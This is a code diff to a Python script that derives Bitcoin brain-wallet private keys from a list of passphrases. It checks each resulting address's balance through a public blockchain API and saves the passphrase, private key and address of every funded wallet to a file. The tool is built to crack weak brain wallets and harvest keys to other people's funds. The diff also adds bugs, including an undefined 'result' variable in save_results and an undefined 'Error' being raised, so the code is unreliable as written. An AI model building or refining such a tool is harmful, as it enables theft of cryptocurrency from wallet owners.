@@ -20,30 +20,33 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 
 # Constants
 RATE_LIMIT = 1  # Max 1 request per second
-TIME_PERIOD = 1  # Time period in seconds for rate limit
+TIME_PERIOD = 3  # Time period in seconds for rate limit
 SATOSHIS_PER_BITCOIN = 1e8
-blockchain_tags = ['total_received', 'final_balance']
+
+blockchain_tags = ['total_received', 'final_balance','n_tx']
 
 # Adjust the check_balance function
 @sleep_and_retry
 @limits(calls=RATE_LIMIT, period=TIME_PERIOD)
-def check_balance(address):
+def check_api(address): 
     try:
-        url = f"https://blockchain.info/address/{address}?format=json"
+        url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/balance"
         htmlfile = urlopen(url, timeout=10)
         htmltext = htmlfile.read().decode('utf-8')
 
         blockchain_info = []
         for tag in blockchain_tags:
             blockchain_info.append(
-                float(re.search(rf'{tag}":(\d+),', htmltext).group(1))
+                float(re.search(rf'{tag}": (\d+),', htmltext).group(1))
             )
-        
-        balance = blockchain_info[1] / SATOSHIS_PER_BITCOIN  # final_balance
-        return balance
+
+        balance = blockchain_info[1] / SATOSHIS_PER_BITCOIN
+        received = blockchain_info[0] 
+        n_tx = blockchain_info[2]
+        return received,balance,n_tx
     except Exception as e:
         logging.error(f"Request failed for address {address}: {e}")
-        return 0
+        return None
 
 def generate_brain_wallet(passphrase):
     try:
@@ -64,9 +67,9 @@ def generate_brain_wallet(passphrase):
 def process_passphrase(passphrase):
     private_key, address = generate_brain_wallet(passphrase)
     if not private_key or not address:
-        return passphrase, None, None, 0
-    balance = check_balance(address)
-    return passphrase, private_key, address, balance
+        raise(Error)
+    received,balance,n_tx = check_api(address)
+    return passphrase, private_key, address, balance,n_tx
 
 def load_passphrases(input_file):
     try:
@@ -75,23 +78,24 @@ def load_passphrases(input_file):
         return passphrases
     except FileNotFoundError:
         logging.error(f"Input file {input_file} not found.")
-        return []
+        return None
 
-def save_results(output_file, results):
+def save_results(output_file,addr_info):
     try:
-        with open(output_file, 'w') as f_out:
-            for result in results:
-                passphrase, private_key, address, balance = result
-                if balance > 0:
-                    f_out.write(f"Passphrase: {passphrase}\n")
-                    f_out.write(f"Private Key: {private_key}\n")
-                    f_out.write(f"Bitcoin Address: {address}\n")
-                    f_out.write(f"Balance: {balance} BTC\n")
-                    f_out.write("\n")
-                else:
-                    logging.info(f"Passphrase {passphrase} resulted in an empty wallet.")
+        with open(output_file, 'a') as f_out:
+            passphrase, private_key, address, balance,n_tx = result
+            if balance > 0:
+                f_out.write(f"Passphrase: {passphrase}\n")
+                f_out.write(f"Private Key: {private_key}\n")
+                f_out.write(f"Bitcoin Address: {address}\n")
+                f_out.write(f"Balance: {balance} BTC\n")
+                f_out.write("\n")
+            else:
+                pass
+
     except IOError as e:
         logging.error(f"Failed to write results to {output_file}: {e}")
+
 
 def main():
     input_file = os.getenv('INPUT_FILE', 'passphrases.txt')
@@ -103,18 +107,18 @@ def main():
         logging.error("No passphrases to process.")
         return
 
-    results = []
+    addrs_with_bal = []
     with ThreadPoolExecutor(max_workers=num_workers) as executor:
         future_to_passphrase = {executor.submit(process_passphrase, passphrase): passphrase for passphrase in passphrases}
 
-        for future in tqdm(as_completed(future_to_passphrase), total=len(passphrases), desc="Processing passphrases"):
+        for future in tqdm(as_completed(future_to_passphrase), total=len(passphrases), desc="Processing passphrases"): 
             try:
-                result = future.result()
-                results.append(result)
-                passphrase, private_key, address, balance = result
+                addr_info=future.result()
+                passphrase, private_key, address, balance,n_tx = addr_info
                 
                 if balance > 0:
                     status = Fore.GREEN + "ACTIVE!" + Style.RESET_ALL
+                    save_results(output_file,addr_info)
                 else:
                     status = Fore.RED + "DEAD" + Style.RESET_ALL
                 
@@ -128,7 +132,6 @@ def main():
             except Exception as e:
                 logging.error(f"Future processing failed: {e}")
 
-    save_results(output_file, results)
     logging.info(f"Processing complete. Results saved to {output_file}")
 
 if __name__ == "__main__":
